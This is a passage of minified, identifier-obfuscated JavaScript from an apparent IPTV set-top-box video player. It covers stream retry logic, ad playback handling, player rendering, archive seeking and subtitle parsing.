if(mode=="off"&&($_("loading").style.display!="none"||lIllO0Imlel1IlI1Ypr=="image")&&c.lastSec!=sec){$_("loading").style.display="none";c.triggerHide(900,!0)}},l0II1l1OTLg0OOQ1lYpr:function(){var c=this;if(gP().is_iptv>2||(!is_vod(c.playElement.url)&&pstream)){c.lifeTimer=setTimeout("vPlayer.l0II1l1OTLg0OOQ1lYpr();",1200);if(c.stopped||c.paused||$_("loading").style.display=="block")return;if(maJor.params.get("timeoutiptv")>55)return;var curTime=c.getCur();if(c.iptv_succed||c.curTime>0||(c.curTime==0&&maJor.platform().match(/lg/)&&maJor.series!="LW")){if(c.curTime!=c.lifeSec){c.lifeN=0;c.lifeSec=c.curTime}else{c.lifeN++;if(ttmac)kjtYpr.popUp("lifeN"+c.lifeN,1000);if(c.lifeN>12&&c.lifeN>maJor.params.get("timeoutiptv")*1.2){c.eventerrvideo()}}}}},rekLife:function(){var c=this;if(!is_rek||lIllO0Imlel1IlI1Ypr=="image"||!rek_url)return;c.lifeTimer=setTimeout("vPlayer.rekLife();",1000);if(!c.paused){c.curTime=c.getCur();if(c.curTime!=c.lifeSec){c.lifeN=0;c.lifeSec=c.curTime}else{c.lifeN++;if(c.lifeN>10){if(ttmac)kjtYpr.popUp("REK END LifeN "+c.lifeN);c.lifeN=0;c.lifeSec=-1;if(c.curTime<1)c.err_rek("errreklifeend0");else c.err_rek("errreklifeend")}}}},err_rek:function(stat){var c=this;kjtYpr.inf("");rek_last=T.inetTime;rek_url="";is_adult=!1;if(handler!="menu"&&!c.stopped)c.easystop();handler="menu";is_rek=!1;setTimeout("IlO11lQ0().play(null,rek_mode);",250);setTimeout("is_adult=true;rek_n=0;",45000)},eventerrvideo:function(event){var c=vPlayer;if(c.is_mini())c.lIOQ0lI1iZm1hQ1O0Ypr();else if(is_rek&&rek_url)c.err_rek("errloadfile"+maJor.platform());else{if(handler=="menu"||rek_url)return;if(c.getCur()==0)gP().sendStat(0);if(maJor.params.get("timeoutiptv")>55)return;if((!pstream||is_vod(c.playUrl))&&c.getCur()>0){setTimeout(function(){c.easystop();c.renderPlayer();lII11lAO1IOllYpr(c.playUrl,!0,c.getCur())},2500);l10I11l10duklS11llOYpr("_FPSoedineniePrervano_!"+c.getCur()+c.playUrl)}else{c.iptv_retry++;if(pstream&&!is_vod(vPlayer.playUrl)&&c.iptv_succed){c.easystop(1);c.renderPlayer();setTimeout(function(){lII11lAO1IOllYpr(c.playUrl,!0)},500);l10I11l10duklS11llOYpr("_FPOshibka_! _FPPodkluchenie_ "+c.iptv_retry+"...")}else if(c.iptv_retry>3){c.lIOQ0lI1iZm1hQ1O0Ypr()}else{if(handler=="player"){lifeN=0;lifeSec=-1;c.setLoading("on");c.easystop(1);c.renderPlayer();c.playUrl=c.streamnum(c.playElement.url,1);lII11lAO1IOllYpr(c.playUrl,!0);l10I11l10duklS11llOYpr("_FPOshibka_ _FPpodklucheniya_! _FPPodkluchenie_  "+(c.iptv_retry+1)+"...")}}}}},sound:null,soundn:0,audioplay:function(url){var c=this;if(url.indexOf("http")!=0||(handler!="player"&&handler!="qual")||c.stopped||!c.playUrlAudio)return;try{c.sound=new Audio(c.playUrlAudio);c.sound.addEventListener("error",function(e){kjtYpr.popUp("Audio err: "+e.currentTarget.error.code,500);if(e.currentTarget.error.code>1&&e.currentTarget.error.code<4){c.sound=null;clearTimeout(c.soundt);c.soundt=setTimeout("vPlayer.audioplay(vPlayer.playUrlAudio);",1500)}});c.sound.load();c.sound.addEventListener('loadedmetadata',function(){if(!c.stopped){c.soundn=2;c.sound.currentTime=c.getCur();c.sound.play()}},!1)}catch(e){kjtYpr.popUp("Not support js audio<br>"+e.message,1200)}},renderPlayer:function(pe){var c=this;var pe=pe||c.playElement||{};if(pe.mini)return;handler="player";$_("main").style.display="none";$_("QualCh").style.display="none";$_("player").style.display="block";$_("recovery","");if(maJor.platform()=="android-device"){if(lIllO0Imlel1IlI1Ypr.match(/html5|playerjs|image/))$_("player").style.backgroundColor="transparent";else $_("player").style.backgroundColor="black"}
$_("jw").style.zIndex="0";if(lIllO0Imlel1IlI1Ypr=="download")var pstr="_FPPereadresaciyaNaFail_...";else if(maJor.sIconPlayer[lIllO0Imlel1IlI1Ypr])pstr="<img id='ico_p' style='padding-top:1px;' width='27' src='"+_img("_ST_"+maJor.sIconPlayer[lIllO0Imlel1IlI1Ypr])+"' />";else pstr="";if(is_rek)$_("prekinfo").style.display="block";else{var url=c.streamnum(pe.url||pe.stream_url||"");if(url.indexOf("md5hash")>=0)url=pe.parser||"";var shortUrl=url.replace(/^(.{12}).*(.{14})$/,"$1...$2");if(url=="description"){$_("playerBottom").style.height="20px";$_("playerBottom").style.top=(maJor.screen().h-11)+"px"}else{$_("pstr",pstr);$_("infR","");$_("infPl","")}
$_("remainingTime","");$_("totalTime","");if(maJor.params.get('next')==1)var vr="_FPPosledovatelno_";else if(maJor.params.get('next')==2)vr="_FPPovtoryat_ _FPodin_";else if(maJor.params.get('next')==4)vr="_FPOtkl._";else vr="_FPPovtoryat_ _FPvse_";var tl="<div id='chtitle' style='line-height: 1;'>"+pe.title+"</div>";if(gP().is_iptv>2)vr="<img width='28' height='23' src='"+pe.logo_30x30+"'> ";if(pe.playlist&&pe.playlist.length){var dopnum="<br><span style='font-size:80%;'>"+(c.PLINDEX+1)+"/"+(pe.playlist.length)+"</span>"}else dopnum="";$_("ptt","<div id='info_right' style='white-space: nowrap; float: right;width: 242px;font-size: 75%;overflow:hidden;padding-top:29px;text-align:right;'>"+vr+"<br>"+shortUrl+"</div>"+"<div id='info_num' style='float:left;width:5%;font-size:120%;padding-top: 12px;'>"+(parseInt(pe.index)+1)+"."+dopnum+"</div>"+tl);fEpg.inPlayer()}
c.init()},l0l0II11lpoPKl1l0YprNext:function(m){var c=this;if(c.playElement.playlist){c.PLINDEX+=m;if(c.PLINDEX<-1)c.PLINDEX=c.playElement.playlist.length-1;if(c.PLINDEX>=0){var ch=c.playElement.playlist[c.PLINDEX];ch.playlist=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.playElement.playlist));c.easystop();IlO11lQ0().navigate(ch,c.playElement.openwith);return}}
setSelect(parseInt(c.playElement.index)+m);if(curCh("stream_url")){c.easystop();IlO11lQ0().navigate(curCh(),c.playElement.openwith)}else c.lIOQ0lI1iZm1hQ1O0Ypr()},arrurl:function(u){var c=this;var url="";try{var z=l0OIIlIIlONuu1111Ypr(u);if(z){var n=0,nmin=10;for(var i=0;i<z.length;i++){if(z[i][2]<nmin&&maJor.params.get('quality')<=z[i][2]){n=i;nmin=z[i][2]}}
url=z[n][1];if(!url){vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();is_loadpage(-1);return}
if(z[n][3]&&z[n][3][0]&&z[n][3][0][0])c.playElement.subsrc=z[n][3];else c.playElement.subsrc=[]}}catch(e){kjtYpr.inf("Error format object{} stream url. Must be {\"720\":{\"url\":\"\",\"title\":\"\"}}",2000)}
return url},lIOI1Iljvp11I0Ypr:function(pe){var c=this;if(c.playElement)c.lastPlayElement=c.playElement;c.playElement=pe;rek_url="";IlO11lQ0().stopLoad();var url=c.streamnum(c.playElement.url);if(!url){kjtYpr.popUp("_FPPustayaSsilka_");c.lIOQ0lI1iZm1hQ1O0Ypr();return}
try{$_("epg_full","");if(url.indexOf("[")==0)url=arrurl(url);else if(url.indexOf("{")==0){c.playElement.json_url=l0OIIlIIlONuu1111Ypr(url);if(c.playElement.json_url)c.lO11O011IIIV01010OIYpr(c.playElement);else kjtYpr.inf("Error JSON decode stream url. Must be {\"720\":{\"url\":\"\",\"title\":\"\"}}",1800);return}else if(url.indexOf("NotFound")==0){return}
if(url.indexOf("[")==0)url=arrurl(url);if(is_m3u8(url))pstream=!0;else pstream=!1;statusbar(url,"link");if(!c.playElement.openwith){if(url.indexOf("#playerjs")>0){url=url.replace("#playerjs","");lIllO0Imlel1IlI1Ypr="playerjs"}else if(url.indexOf("#media")>0){lIllO0Imlel1IlI1Ypr="media";url=url.replace("#media","")}else if(is_img(url)||gV(c.playElement,"type")=="img")lIllO0Imlel1IlI1Ypr="image";else lIllO0Imlel1IlI1Ypr=(pstream)?maJor.params.get('streamplayer'):maJor.params.get('player')}else lIllO0Imlel1IlI1Ypr=c.playElement.openwith;c.playUrl=url;c.setPosition(0);if(maJor.platform()=="android-device"&&rek_url)lIllO0Imlel1IlI1Ypr="html5";if(!c.player().exis()){kjtYpr.popUp(lIllO0Imlel1IlI1Ypr+" player not loaded or not supported on your device! Change type player in Settings or restart app");handler="menu";return}
optLangSel=0;if(lIllO0Imlel1IlI1Ypr=="image")c.hidePlayer();else{c.showPlayer();$_('progressBall').className='progressBallInitial';$_("progressBuffer").style.width="0px";$_("progressBarStatus").style.width='6px';$_('progressBall').style.marginLeft="-6px";$_("remainingTime","");$_("totalTime","")}
rowID=1;FsetFocus(0);c.subtitles.parse();clearTimeout(c.lifeTimer);info_mode=0;c.iptv_retry=0;if(gP().is_iptv>2||(!is_vod(url)&&pstream)){lifeN=0;lifeSec=-1;c.lifeTimer=setTimeout("vPlayer.l0II1l1OTLg0OOQ1lYpr();",2000);$_("progressBall").style.display="none";fEpg.inPlayer()}else{$_("progressBall").style.display="block"}
if(c.playElement.catchup||c.playElement.catchup_days){is_arc=1;$_("progressBall").style.display="block";c.playElement.catchup=c.playElement.catchup||"default"
c.playElement.catchup_days=c.playElement.catchup_days||3;if(c.playElement.arcCurTime){c.arc_timestamp=parseInt(c.playElement.arcCurTime);c.arc_fwd=c.arc_timestamp-T.timestamp}}else is_arc=0;c.renderPlayer();lII11lAO1IOllYpr(url);c.triggerHide();c.setLoading("on");c.getSaveTime()}catch(e){kjtYpr.popUp("Err Play media:<br>"+e.message);lII11lAO1IOllYpr(url)}},gl_position:0,setPosition:function(position){var c=this;c.gl_position=position;$_("progressBall","");if(maJor.screen().w-position<13){$_('progressBall').style.marginLeft="-20px";$_("progressBarStatus").style.width=maJor.screen().w+'px'}else if(position<=6){$_("progressBarStatus").style.width='6px';$_('progressBall').style.marginLeft="-6px"}else{$_("progressBarStatus").style.width=position+'px';$_('progressBall').style.marginLeft="-6px"}},triggerHide:function(t,n){var c=this;clearTimeout(c.hideTimerId);if(handler=="menu"&&c.stopped)return;c.hideTimerId=setTimeout(function(){c.hidePlayer(n)},(t||5000))},hidePlayer:function(force){var c=this;if(is_rek)return;if(!force&&($_("loading").style.display=="block"||c.glSec>0||handler=="qual"||c.paused||is_rek)){c.triggerHide()}else{console.log("hide player");if(maJor.platform()=="android-device")andr.cmd("hideSystemUI");if(maJor.platform()=="mag"){stb.SetWinMode(1);stb.SetTopWin(1)}else if(maJor.platform()=="dune"){$_("player").style.display="none"}
if(info_mode==1)return;else if(info_mode==3||maJor.params.get('time')){$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("recovery").style.display="none";$_("ptt").style.display="none";$_("epg_full").style.display="none";$_("infPl").style.display="none";$_("pstream").style.display="block";$_("player_time").style.display="block";if($_("ico_p"))$_("ico_p").style.display="none";if($_("infR"))$_("infR").style.display="none"}else if(info_mode==4){$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("recovery").style.display="none";$_("ptt").style.display="block";$_("pstream").style.display="block";$_("player_time").style.display="block";$_("epg_player").style.display="block";$_("epg_player").style.height=css_wh(85)+"px";if($_("ico_p"))$_("ico_p").style.display="none";if($_("infR"))$_("infR").style.display="none";if($_("info_num"))$_("info_num").style.display="none"}else{$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("ptt").style.display="none";$_("pstream").style.display="none";$_("recovery").style.display="none";$_("epg_full").style.display="none"}
$_("thumb").style.display="none";if($_("arrowtime"))$_("arrowtime").style.display="none"}},showPlayer:function(){if(maJor.platform()=="mag"){try{stb.SetWinMode(0)}catch(e){}
try{stb.SetTopWin(0)}catch(e){}}else if(maJor.platform()=="dune")$_("player").style.display="block";$_("playerBottom").style.display="block";if(!is_rek){$_("infR",vPlayer.getInfo());$_("buttonTop").style.display="block";$_("ptt").style.display="block";$_("pstream").style.display="block";$_("recovery").style.display="block";if($_("ico_p"))$_("ico_p").style.display="block";if($_("infR"))$_("infR").style.display="block";if($_("info_num"))$_("info_num").style.display="block";if($_("epg_player"))$_("epg_player").style.height="45px";fEpg.inPlayer()}},subtitles:{exis:function(){var c=vPlayer;return c.playElement.subsrc&&c.playElement.subsrc.length},parse:function(){var c=vPlayer;if(c.playElement.subtitles){if(typeof c.playElement.subtitles=="string")c.playElement.subsrc=c.playElement.subtitles=l0OIIlIIlONuu1111Ypr(c.playElement.subtitles);else c.playElement.subsrc=c.playElement.subtitles;c.playElement.sub_sel=0}},getName:function(sel){var c=vPlayer;if(sel==null)sel=c.playElement.sub_sel;if(!sel)return"_FPOtkl_";else return c.playElement.subsrc[sel-1][0]},timerSub:null,lIIIldhI1l1OQ1IYpr:function(){var c=vPlayer;if($_("subtitle").style.display=="none")return clearInterval(this.timerSub);var curTime=c.getCur()*this.moveSub;try{var subtitle='';if(curTime.toFixed(1)>=this.videosub_timecode_min(this.el.subtitles[el.subcount][1])&&curTime.toFixed(1)<=this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])){subtitle=this.el.subtitles[el.subcount][2];if(this.el.subtitles[el.subcount][3])subtitle+="<br>"+this.el.subtitles[this.el.subcount][3]}
if(curTime.toFixed(1)>this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])&&this.el.subcount<(this.el.subtitles.length-1)){this.el.subcount++}
$_("subtitle",subtitle)}catch(e){$_("subtitle","")}},el:{"subtitles":[]},moveSub:1,videosub_timecode_min:function(tc){if(tc&&tc.split(' --> '))return this.lOOOl1ILIlZUO01lQYpr(tc.split(' --> ')[0]);return 0},videosub_timecode_max:function(tc){if(tc&&tc.split(' --> '))return this.lOOOl1ILIlZUO01lQYpr(tc.split(' --> ')[1]);return 1},lOOOl1ILIlZUO01lQYpr:function(tc){var tc1=tc.split(',');var tc2=tc1[0].split(':');if(tc2.length==2)tc2.unshift(0);var secs=Math.floor(tc2[0]*60*60)+Math.floor(tc2[1]*60)+Math.floor(tc2[2]);return secs},parseVtt:function(xmlDoc){this.el.subtitles=[];var records=xmlDoc.replace(/\r/g,"").split('\n\n');for(var r=0;r<records.length;r++){if(records[r].indexOf("-->")==-1)continue;var record=records[r].split('\n');if(record[0].indexOf("-->")>0){record.unshift("");this.el.subtitles.push(record)}else{this.el.subtitles.push(record)}}
this.lllIOlu0iNO10IIYpr()},lllIOlu0iNO10IIYpr:function(){if($_("subtitle").style.display=="none")return;this.el.subcount=0;var curTime=vPlayer.getCur()*this.moveSub;while(this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])<curTime.toFixed(1)){this.el.subcount++;if(this.el.subcount>this.el.subtitles.length-1){this.el.subcount=this.el.subtitles.length-1;break}}},splitHls:function(xmlDoc){var c=vPlayer,x;var regexp=new RegExp("(https?://.*)","ig");var n=0,s="";var U=[];while((x=regexp.exec(xmlDoc))!=null){U.push(x[1])}
function getU(u){uHelper.create("directnoheader|proxy").get(u).parse=function(resp){if(resp){s+=resp;n++;if(n<U.length)getU(U[n]);else{vPlayer.subtitles.parseVtt(s)}}}}
getU(U[n])},lQO1OHMPvAl00OYpr:function(){var c=vPlayer;var subtitlesrc='';var subsrc=c.playElement.subsrc,sub_sel=c.playElement.sub_sel;clearInterval(this.timerSub);if(sub_sel<1)c.playElement.sub_sel=subsrc.length;else if(sub_sel>subsrc.length)c.playElement.sub_sel=0;sub_sel=c.playElement.sub_sel;if(subsrc.length&&sub_sel){var src=subsrc[sub_sel-1];$_("subtitle").style.display="block";subtitlesrc=src[1]}else{$_("subtitle").style.display="none";return}
this.moveSub=src[3]||1;if(subtitlesrc.indexOf("md5hash")&&src[2]){uHelper.create("directnoheader|proxy").get(trylink(src[2])).parse=function(s){if(s){c.playElement.subsrc[sub_sel-1][2]=null;c.playElement.subsrc[sub_sel-1][1]=c.playElement.subsrc[sub_sel-1][1].replace("md5hash",s);c.subtitles.lQO1OHMPvAl00OYpr()}else kjtYpr.popUp("Error download/parse subtitles<br>"+src[2],2000)}}else{this.timerSub=setInterval("vPlayer.subtitles.lIIIldhI1l1OQ1IYpr();",320);uHelper.create("directnoheader|proxy").get(trylink(subtitlesrc)).parse=function(s){if(s){if(s.indexOf("#EXTM3U")>=0){return c.subtitles.splitHls(s)}
this.parseVtt(s)}else{$_("subtitle").style.display="none";c.playElement.sub_sel=0;kjtYpr.popUp("Error download subtitles!<br>"+subtitlesrc,2000)}}
el.subcount=0}}},init:function(){var c=this;video=$_('video');if($_('progressBarClick')){$_('progressBarClick').onclick=function(e){if(rek_url)return;var x=e.pageX-$(this).offset().left;if(is_arc){var tt=Math.ceil(T.timestamp-(1-(x/maJor.screen().w))*gV(c.playElement,"catchup_days")*24*3600);c.arc_fwd=0;c.arc_timestamp=0;c.arcfwd(Math.ceil(tt-T.timestamp))}else c.seek((x/maJor.screen().w)*c.getTotal())};$_("progressBarClick").onmouseout=function(event){$_("arrowtime").style.display="none";$_("progressBarClick").style.height="8px";$_("progressBall").style.display="none"};$_('progressBarClick').onmousemove=function(e){$_("progressBarClick").style.height="12px";$_("progressBall").style.display="block";var totalTime=c.getTotal();var pos=e.pageX-$(this).offset().left;if(is_arc){$_("arrowtime").style.display="block";if(pos/maJor.screen().w>0.96)pos=Math.ceil(0.96*maJor.screen().w);else if(pos/maJor.screen().w<0.02)pos=85;$_("arrowtime").style.left=(pos-css_w(80))+"px";var tt=Math.ceil(T.timestamp-(1-(pos/maJor.screen().w))*gV(c.playElement,"catchup_days")*24*3600);$_('arrowtime',dt(tt,!0,!0))}else if(totalTime>5){$_("arrowtime").style.display="block";var proc=pos-43;if(proc<3)proc=3;else if(proc>(maJor.screen().w-95))proc=maJor.screen().w-95;$_("arrowtime").style.left=proc+"px";var y=Math.ceil((pos/maJor.screen().w)*totalTime);$_('arrowtime',getTimeFromMS(y))}}}
$_('jw').onmousemove=$_('player').onmousemove=$_('video').onmousemove=c.OnMouseMove},whitestripes:0,setWhitestripes:function(x){var c=this;if(x!=null)c.whitestripes+=x;if(c.whitestripes<1){c.whitestripes=0;$_("whitestripes1").style.display="none";$_("whitestripes2").style.display="none"}else{if(c.whitestripes>100)c.whitestripes=100;$_("whitestripes1").style.display="block";$_("whitestripes2").style.display="block";$_("whitestripes1").style.height=c.whitestripes+"px";$_("whitestripes2").style.height=c.whitestripes+"px";$_("whitestripes2").style.top=(720-c.whitestripes)+"px"}}}